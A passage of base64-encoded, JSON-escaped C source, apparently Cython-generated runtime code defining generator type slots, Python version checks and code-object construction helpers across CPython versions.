1cbiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyXG5zdGF0aWMgdm9pZCBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQoUHlUeXBlT2JqZWN0ICp0eXBlLCBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCAqc3RhdGljX2Ftc2VuZF9tZXRob2RzLCBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgYW1fc2VuZCkge1xuICAgIFB5X3NzaXplX3QgcHRyX29mZnNldCA9IChjaGFyKikodHlwZS0+dHBfYXNfYXN5bmMpIC0gKGNoYXIqKXR5cGU7XG4gICAgaWYgKHB0cl9vZmZzZXQgPCAwIHx8IHB0cl9vZmZzZXQgPiB0eXBlLT50cF9iYXNpY3NpemUpIHtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBtZW1jcHkoKHZvaWQqKXN0YXRpY19hbXNlbmRfbWV0aG9kcywgKHZvaWQqKSh0eXBlLT50cF9hc19hc3luYyksIHNpemVvZigqdHlwZS0+dHBfYXNfYXN5bmMpKTtcbiAgICBzdGF0aWNfYW1zZW5kX21ldGhvZHMtPmFtX3NlbmQgPSBhbV9zZW5kO1xuICAgIHR5cGUtPnRwX2FzX2FzeW5jID0gX19QeXhfU2xvdFRwQXNBc3luYyhzdGF0aWNfYW1zZW5kX21ldGhvZHMpO1xufVxuI2VuZGlmXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZykge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGFyZyk7XG4gICAgX19QeXhfVHlwZU5hbWUgc2VsZl90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUoKFB5T2JqZWN0KilzZWxmKSk7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwgImNhbm5vdCBwaWNrbGUgXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgb2JqZWN0IixcbiAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmX3R5cGVfbmFtZSk7XG4gICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHNlbGZfdHlwZV9uYW1lKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cblxuXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfR2VuZXJhdG9yX21ldGhvZHNbXSA9IHtcbiAgICB7InNlbmQiLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9TZW5kLCBNRVRIX08sXG4gICAgIFB5RG9jX1NUUigic2VuZChhcmcpIC0+IHNlbmQgXCdhcmdcJyBpbnRvIGdlbmVyYXRvcixcXG5yZXR1cm4gbmV4dCB5aWVsZGVkIHZhbHVlIG9yIHJhaXNlIFN0b3BJdGVyYXRpb24uIil9LFxuICAgIHsidGhyb3ciLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9UaHJvdywgTUVUSF9WQVJBUkdTLFxuICAgICBQeURvY19TVFIoInRocm93KHR5cFssdmFsWyx0Yl1dKSAtPiByYWlzZSBleGNlcHRpb24gaW4gZ2VuZXJhdG9yLFxcbnJldHVybiBuZXh0IHlpZWxkZWQgdmFsdWUgb3IgcmFpc2UgU3RvcEl0ZXJhdGlvbi4iKX0sXG4gICAgeyJjbG9zZSIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX0Nsb3NlX01ldGhvZCwgTUVUSF9OT0FSR1MsXG4gICAgIFB5RG9jX1NUUigiY2xvc2UoKSAtPiByYWlzZSBHZW5lcmF0b3JFeGl0IGluc2lkZSBnZW5lcmF0b3IuIil9LFxuICAgIHsiX19yZWR1Y2VfZXhfXyIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4LCBNRVRIX08sIDB9LFxuICAgIHsiX19yZWR1Y2VfXyIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4LCBNRVRIX05PQVJHUywgMH0sXG4gICAgezAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5TWVtYmVyRGVmIF9fcHl4X0dlbmVyYXRvcl9tZW1iZXJsaXN0W10gPSB7XG4gICAgeyJnaV95aWVsZGZyb20iLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCB5aWVsZGZyb20pLCBSRUFET05MWSxcbiAgICAgUHlEb2NfU1RSKCJvYmplY3QgYmVpbmcgaXRlcmF0ZWQgYnkgXCd5aWVsZCBmcm9tXCcsIG9yIE5vbmUiKX0sXG4gICAgeyJnaV9jb2RlIiwgVF9PQkpFQ1QsIG9mZnNldG9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCwgZ2lfY29kZSksIFJFQURPTkxZLCBOVUxMfSxcbiAgICB7Il9fbW9kdWxlX18iLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCBnaV9tb2R1bGVuYW1lKSwgMCwgMH0sXG4gICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIGdpX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LFxuICAgIHswLCAwLCAwLCAwLCAwfVxufTtcbnN0YXRpYyBQeUdldFNldERlZiBfX3B5eF9HZW5lcmF0b3JfZ2V0c2V0c1tdID0ge1xuICAgIHsiX19uYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0Nvcm91dGluZV9nZXRfbmFtZSwgKHNldHRlcilfX1B5eF9Db3JvdXRpbmVfc2V0X25hbWUsXG4gICAgIFB5RG9jX1NUUigibmFtZSBvZiB0aGUgZ2VuZXJhdG9yIiksIDB9LFxuICAgIHsiX19xdWFsbmFtZV9fIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X3F1YWxuYW1lLCAoc2V0dGVyKV9fUHl4X0Nvcm91dGluZV9zZXRfcXVhbG5hbWUsXG4gICAgIFB5RG9jX1NUUigicXVhbGlmaWVkIG5hbWUgb2YgdGhlIGdlbmVyYXRvciIpLCAwfSxcbiAgICB7ImdpX2ZyYW1lIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X2ZyYW1lLCBOVUxMLFxuICAgICBQeURvY19TVFIoIkZyYW1lIG9mIHRoZSBnZW5lcmF0b3IiKSwgMH0sXG4gICAgeyJnaV9ydW5uaW5nIiwgX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nX2dldHRlciwgTlVMTCwgTlVMTCwgTlVMTH0sXG4gICAgezAsIDAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0dlbmVyYXRvclR5cGVfc2xvdHNbXSA9IHtcbiAgICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX1B5eF9Db3JvdXRpbmVfZGVhbGxvY30sXG4gICAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZX0sXG4gICAge1B5X3RwX2l0ZXIsICh2b2lkICopUHlPYmplY3RfU2VsZkl0ZXJ9LFxuICAgIHtQeV90cF9pdGVybmV4dCwgKHZvaWQgKilfX1B5eF9HZW5lcmF0b3JfTmV4dH0sXG4gICAge1B5X3RwX21ldGhvZHMsICh2b2lkICopX19weXhfR2VuZXJhdG9yX21ldGhvZHN9LFxuICAgIHtQeV90cF9tZW1iZXJzLCAodm9pZCAqKV9fcHl4X0dlbmVyYXRvcl9tZW1iZXJsaXN0fSxcbiAgICB7UHlfdHBfZ2V0c2V0LCAodm9pZCAqKV9fcHl4X0dlbmVyYXRvcl9nZXRzZXRzfSxcbiAgICB7UHlfdHBfZ2V0YXR0cm8sICh2b2lkICopIFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyfSxcbiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAge1B5X3RwX2ZpbmFsaXplLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9kZWx9LFxuI2VuZGlmXG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMVxuICAgIHtQeV9hbV9zZW5kLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9BbVNlbmR9LFxuI2VuZGlmXG4gICAgezAsIDB9LFxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9HZW5lcmF0b3JUeXBlX3NwZWMgPSB7XG4gICAgX19QWVhfVFlQRV9NT0RVTEVfUFJFRklYICJnZW5lcmF0b3IiLFxuICAgIHNpemVvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QpLFxuICAgIDAsXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMFxuICAgIFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRSB8XG4jZW5kaWZcbiAgICBQeV9UUEZMQUdTX0RFRkFVTFQgfCBQeV9UUEZMQUdTX0hBVkVfR0MgfCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUgfCBfX1B5eF9UUEZMQUdTX0hBVkVfQU1fU0VORCxcbiAgICBfX3B5eF9HZW5lcmF0b3JUeXBlX3Nsb3RzXG59O1xuI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDJcbnN0YXRpYyBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCBfX3B5eF9HZW5lcmF0b3JfYXNfYXN5bmM7XG4jZW5kaWZcbnN0YXRpYyBpbnQgX19weXhfR2VuZXJhdG9yX2luaXQoUHlPYmplY3QgKm1vZHVsZSkge1xuICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7XG4gICAgbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlID0gX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoXG4gICAgICAgIG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlLCBtb2R1bGUsICZfX3B5eF9HZW5lcmF0b3JUeXBlX3NwZWMsIE5VTEwpO1xuICAgIGlmICh1bmxpa2VseSghbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDJcbiAgICBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQobXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlLCAmX19weXhfR2VuZXJhdG9yX2FzX2FzeW5jLCAmX19QeXhfQ29yb3V0aW5lX0FtU2VuZCk7XG4jZW5kaWZcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoUHlPYmplY3QgKnNlbGYpIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmO1xuICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7XG4gICAgfVxuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgUHlfTm9uZSwgJnJldHZhbCwgMCk7XG4gICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAodm9pZCkgcmVzdWx0O1xuICAgIGFzc2VydCAocmVzdWx0ID09IFBZR0VOX1JFVFVSTiB8fCByZXN1bHQgPT0gUFlHRU5fRVJST1IpO1xuICAgIGFzc2VydCAoKHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gJiYgcmV0dmFsICE9IE5VTEwpIHx8IChyZXN1bHQgPT0gUFlHRU5fRVJST1IgJiYgcmV0dmFsID09IE5VTEwpKTtcbiAgICByZXR1cm4gcmV0dmFsO1xufVxuXG5cbnN0YXRpYyB1bnNpZ25lZCBsb25nIF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24odm9pZCkge1xuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDAwMFxuICAgIHJldHVybiBQeV9WZXJzaW9uICYgfjB4RkZVTDtcbiNlbHNlXG4gICAgc3RhdGljIHVuc2lnbmVkIGxvbmcgX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbiA9IDA7XG4gICAgaWYgKF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPT0gMCkge1xuICAgICAgICBjb25zdCBjaGFyKiBydF92ZXJzaW9uID0gUHlfR2V0VmVyc2lvbigpO1xuICAgICAgICB1bnNpZ25lZCBsb25nIHZlcnNpb24gPSAwO1xuICAgICAgICB1bnNpZ25lZCBsb25nIGZhY3RvciA9IDB4MDEwMDAwMDBVTDtcbiAgICAgICAgdW5zaWduZWQgaW50IGRpZ2l0ID0gMDtcbiAgICAgICAgaW50IGkgPSAwO1xuICAgICAgICB3aGlsZSAoZmFjdG9yKSB7XG4gICAgICAgICAgICB3aGlsZSAoXCcwXCcgPD0gcnRfdmVyc2lvbltpXSAmJiBydF92ZXJzaW9uW2ldIDw9IFwnOVwnKSB7XG4gICAgICAgICAgICAgICAgZGlnaXQgPSBkaWdpdCAqIDEwICsgKHVuc2lnbmVkIGludCkgKHJ0X3ZlcnNpb25baV0gLSBcJzBcJyk7XG4gICAgICAgICAgICAgICAgKytpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdmVyc2lvbiArPSBmYWN0b3IgKiBkaWdpdDtcbiAgICAgICAgICAgIGlmIChydF92ZXJzaW9uW2ldICE9IFwnLlwnKVxuICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgZGlnaXQgPSAwO1xuICAgICAgICAgICAgZmFjdG9yID4+PSA4O1xuICAgICAgICAgICAgKytpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPSB2ZXJzaW9uO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbjtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24odW5zaWduZWQgbG9uZyBjdF92ZXJzaW9uLCB1bnNpZ25lZCBsb25nIHJ0X3ZlcnNpb24sIGludCBhbGxvd19uZXdlcikge1xuICAgIGNvbnN0IHVuc2lnbmVkIGxvbmcgTUFKT1JfTUlOT1IgPSAweEZGRkYwMDAwVUw7XG4gICAgaWYgKChydF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpID09IChjdF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpKVxuICAgICAgICByZXR1cm4gMDtcbiAgICBpZiAobGlrZWx5KGFsbG93X25ld2VyICYmIChydF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpID4gKGN0X3ZlcnNpb24gJiBNQUpPUl9NSU5PUikpKVxuICAgICAgICByZXR1cm4gMTtcbiAgICB7XG4gICAgICAgIGNoYXIgbWVzc2FnZVsyMDBdO1xuICAgICAgICBQeU9TX3NucHJpbnRmKG1lc3NhZ2UsIHNpemVvZihtZXNzYWdlKSxcbiAgICAgICAgICAgICAgICAgICAgICAiY29tcGlsZSB0aW1lIFB5dGhvbiB2ZXJzaW9uICVkLiVkICJcbiAgICAgICAgICAgICAgICAgICAgICAib2YgbW9kdWxlIFwnJS4xMDBzXCcgIlxuICAgICAgICAgICAgICAgICAgICAgICIlcyAiXG4gICAgICAgICAgICAgICAgICAgICAgInJ1bnRpbWUgdmVyc2lvbiAlZC4lZCIsXG4gICAgICAgICAgICAgICAgICAgICAgIChpbnQpIChjdF92ZXJzaW9uID4+IDI0KSwgKGludCkgKChjdF92ZXJzaW9uID4+IDE2KSAmIDB4RkYpLFxuICAgICAgICAgICAgICAgICAgICAgICBfX1B5eF9NT0RVTEVfTkFNRSxcbiAgICAgICAgICAgICAgICAgICAgICAgKGFsbG93X25ld2VyKSA/ICJ3YXMgbmV3ZXIgdGhhbiIgOiAiZG9lcyBub3QgbWF0Y2giLFxuICAgICAgICAgICAgICAgICAgICAgICAoaW50KSAocnRfdmVyc2lvbiA+PiAyNCksIChpbnQpICgocnRfdmVyc2lvbiA+PiAxNikgJiAweEZGKVxuICAgICAgICk7XG4gICAgICAgIHJldHVybiBQeUVycl9XYXJuRXgoTlVMTCwgbWVzc2FnZSwgMSk7XG4gICAgfVxufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fUHlDb2RlX05ldyhpbnQgYSwgaW50IHAsIGludCBrLCBpbnQgbCwgaW50IHMsIGludCBmLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjLCBQeU9iamVjdCogbiwgUHlPYmplY3QgKnYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZnYsIFB5T2JqZWN0ICpjZWxsLCBQeU9iamVjdCogZm4sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgaW50IGZsaW5lLCBQeU9iamVjdCAqbG5vcykge1xuICAgICAgICBQeU9iamVjdCAqZXhjZXB0aW9uX3RhYmxlID0gTlVMTDtcbiAgICAgICAgUHlPYmplY3QgKnR5cGVzX21vZHVsZT1OVUxMLCAqY29kZV90eXBlPU5VTEwsICpyZXN1bHQ9TlVMTDtcbiAgICAgICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwXG4gICAgICAgIFB5T2JqZWN0ICp2ZXJzaW9uX2luZm87XG4gICAgICAgIFB5T2JqZWN0ICpweV9taW5vcl92ZXJzaW9uID0gTlVMTDtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGxvbmcgbWlub3JfdmVyc2lvbiA9IDA7XG4gICAgICAgIFB5T2JqZWN0ICp0eXBlLCAqdmFsdWUsICp0cmFjZWJhY2s7XG4gICAgICAgIFB5RXJyX0ZldGNoKCZ0eXBlLCAmdmFsdWUsICZ0cmFjZWJhY2spO1xuICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMDAwXG4gICAgICAgIG1pbm9yX3ZlcnNpb24gPSAxMTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgaWYgKCEodmVyc2lvbl9pbmZvID0gUHlTeXNfR2V0T2JqZWN0KCJ2ZXJzaW9uX2luZm8iKSkpIGdvdG8gZW5kO1xuICAgICAgICBpZiAoIShweV9taW5vcl92ZXJzaW9uID0gUHlTZXF1ZW5jZV9HZXRJdGVtKHZlcnNpb25faW5mbywgMSkpKSBnb3RvIGVuZDtcbiAgICAgICAgbWlub3JfdmVyc2lvbiA9IFB5TG9uZ19Bc0xvbmcocHlfbWlub3JfdmVyc2lvbik7XG4gICAgICAgIFB5X0RFQ1JFRihweV9taW5vcl92ZXJzaW9uKTtcbiAgICAgICAgaWYgKG1pbm9yX3ZlcnNpb24gPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkgZ290byBlbmQ7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAoISh0eXBlc19tb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoInR5cGVzIikpKSBnb3RvIGVuZDtcbiAgICAgICAgaWYgKCEoY29kZV90eXBlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyh0eXBlc19tb2R1bGUsICJDb2RlVHlwZSIpKSkgZ290byBlbmQ7XG4gICAgICAgIGlmIChtaW5vcl92ZXJzaW9uIDw9IDcpIHtcbiAgICAgICAgICAgICh2b2lkKXA7XG4gICAgICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oY29kZV90eXBlLCAiaWlpaWlPT09PT09pT09PIiwgYSwgaywgbCwgcywgZiwgY29kZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zLCBmdiwgY2VsbCk7XG4gICAgICAgIH0gZWxzZSBpZiAobWlub3JfdmVyc2lvbiA8PSAxMCkge1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpaU9PT09PT2lPT08iLCBhLHAsIGssIGwsIHMsIGYsIGNvZGUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgIGMsIG4sIHYsIGZuLCBuYW1lLCBmbGluZSwgbG5vcywgZnYsIGNlbGwpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaWYgKCEoZXhjZXB0aW9uX3RhYmxlID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZShOVUxMLCAwKSkpIGdvdG8gZW5kO1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpaU9PT09PT09pT09PTyIsIGEscCwgaywgbCwgcywgZiwgY29kZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIG5hbWUsIGZsaW5lLCBsbm9zLCBleGNlcHRpb25fdGFibGUsIGZ2LCBjZWxsKTtcbiAgICAgICAgfVxuICAgIGVuZDpcbiAgICAgICAgUHlfWERFQ1JFRihjb2RlX3R5cGUpO1xuICAgICAgICBQeV9YREVDUkVGKGV4Y2VwdGlvbl90YWJsZSk7XG4gICAgICAgIFB5X1hERUNSRUYodHlwZXNfbW9kdWxlKTtcbiAgICAgICAgaWYgKHR5cGUpIHtcbiAgICAgICAgICAgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRyYWNlYmFjayk7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMDAwXG4gIHN0YXRpYyBQeUNvZGVPYmplY3QqIF9fUHl4X19QeUNvZGVfTmV3KGludCBhLCBpbnQgcCwgaW50IGssIGludCBsLCBpbnQgcywgaW50IGYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqYywgUHlPYmplY3QqIG4sIFB5T2JqZWN0ICp2LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZnYsIFB5T2JqZWN0ICpjZWxsLCBQeU9iamVjdCogZm4sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBpbnQgZmxpbmUsIFB5T2JqZWN0ICpsbm9zKSB7XG4gICAgUHlDb2RlT2JqZWN0ICpyZXN1bHQ7XG4gICAgcmVzdWx0ID1cbiAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gICAgICAgIFB5VW5zdGFibGVfQ29kZV9OZXdXaXRoUG9zT25seUFyZ3NcbiAgICAgICNlbHNlXG4gICAgICAgIFB5Q29kZV9OZXdXaXRoUG9zT25seUFyZ3NcbiAgICAgICNlbmRpZlxuICAgICAgICAoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBuYW1lLCBmbGluZSwgbG5vcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXMpO1xuICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBjMDBBMVxuICAgIGlmIChsaWtlbHkocmVzdWx0KSlcbiAgICAgICAgcmVzdWx0LT5fY29fZmlyc3R0cmFjZWFibGUgPSAwO1xuICAgICNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG4gIH1cbiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwQjIgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAjZGVmaW5lIF9fUHl4X19QeUNvZGVfTmV3KGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpXFxcbiAgICAgICAgICBQeUNvZGVfTmV3V2l0aFBvc09ubHlBcmdzKGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X19QeUNvZGVfTmV3KGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpXFxcbiAgICAgICAgICBQeUNvZGVfTmV3KGEsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpXG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlDb2RlX05ldyhcbiAgICAgICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjcixcbiAgICAgICAgUHlPYmplY3QgKiBjb25zdCAqdmFybmFtZXMsXG4gICAgICAgIFB5T2JqZWN0ICpmaWxlbmFtZSxcbiAgICAgICAgUHlPYmplY3QgKmZ1bmNuYW1lLFxuICAgICAgICBjb25zdCBjaGFyICpsaW5lX3RhYmxlLFxuICAgICAgICBQeU9iamVjdCAqdHVwbGVfZGVkdXBfbWFwXG4pIHtcbiAgICBQeU9iamVjdCAqY29kZV9vYmogPSBOVUxMLCAqdmFybmFtZXNfdHVwbGVfZGVkdXAgPSBOVUxMLCAqY29kZV9ieXRlcyA9IE5VTEwsICpsaW5lX3RhYmxlX2J5dGVzID0gTlVMTDtcbiAgICBQeV9zc2l6ZV90IHZhcl9jb3VudCA9IChQeV9zc2l6ZV90KSBkZXNjci5ubG9jYWxzO1xuICAgIFB5T2JqZWN0ICp2YXJuYW1lc190dXBsZSA9IFB5VHVwbGVfTmV3KHZhcl9jb3VudCk7XG4gICAgaWYgKHVubGlrZWx5KCF2YXJuYW1lc190dXBsZSkpIHJldHVybiBOVUxMO1xuICAgIGZvciAoUHlfc3NpemVfdCBpPTA7IGkgPCB2YXJfY291bnQ7IGkrKykge1xuICAgICAgICBQeV9JTkNSRUYodmFybmFtZXNbaV0pO1xuICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTSh2YXJuYW1lc190dXBsZSwgaSwgdmFybmFtZXNbaV0pICE9ICgwKSkgZ290byBkb25lO1xuICAgIH1cbiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwID0gUHlEaWN0X0dldEl0ZW0odHVwbGVfZGVkdXBfbWFwLCB2YXJuYW1lc190dXBsZSk7XG4gICAgaWYgKCF2YXJuYW1lc190dXBsZV9kZWR1cCkge1xuICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW0odHVwbGVfZGVkdXBfbWFwLCB2YXJuYW1lc190dXBsZSwgdmFybmFtZXNfdHVwbGUpIDwgMCkpIGdvdG8gZG9uZTtcbiAgICAgICAgdmFybmFtZXNfdHVwbGVfZGVkdXAgPSB2YXJuYW1lc190dXBsZTtcbiAgICB9XG4gICAgI2Vsc2VcbiAgICB2YXJuYW1lc190dXBsZV9kZWR1cCA9IFB5RGljdF9TZXREZWZhdWx0KHR1cGxlX2RlZHVwX21hcCwgdmFybmFtZXNfdHVwbGUsIHZhcm5hbWVzX3R1cGxlKTtcbiAgICBpZiAodW5saWtlbHkoIXZhcm5hbWVzX3R1cGxlX2RlZHVwKSkgZ290byBkb25lO1xuICAgICNlbmRpZlxuICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5X0lOQ1JFRih2YXJuYW1lc190dXBsZV9kZWR1cCk7XG4gICAgI2VuZGlmXG4gICAgaWYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gKDB4MDMwYjAwMDApICYmIGxpbmVfdGFibGUgIT0gTlVMTFxuICAgICAgICAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCkge1xuICAgICAgICBsaW5lX3RhYmxlX